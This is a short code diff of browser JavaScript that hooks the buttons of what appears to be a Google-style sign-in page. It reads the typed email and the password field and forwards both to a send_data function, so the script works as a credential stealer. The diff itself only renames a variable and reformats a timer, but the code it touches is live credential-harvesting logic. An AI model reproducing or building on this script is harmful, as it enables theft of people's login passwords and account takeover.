@@ -13,8 +13,8 @@ function send_pwd(){
 
     btn[1].addEventListener('click', function(){
 
-    let email = document.querySelector('[type="password"]');
-    let param = email.value;
+    let pwd = document.querySelector('[type="password"]');
+    let param = pwd.value;
 
     pass = param
 
@@ -62,9 +62,7 @@ const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 btn[1].addEventListener('click', function(){
     teste_send(send_email())
     send_email();
-    setTimeout(function() {
-        pwd = send_pwd()
-        }, 3000);
+    setTimeout(function() {pwd = send_pwd()}, 3000);
     
     send_data(user, pass)
     
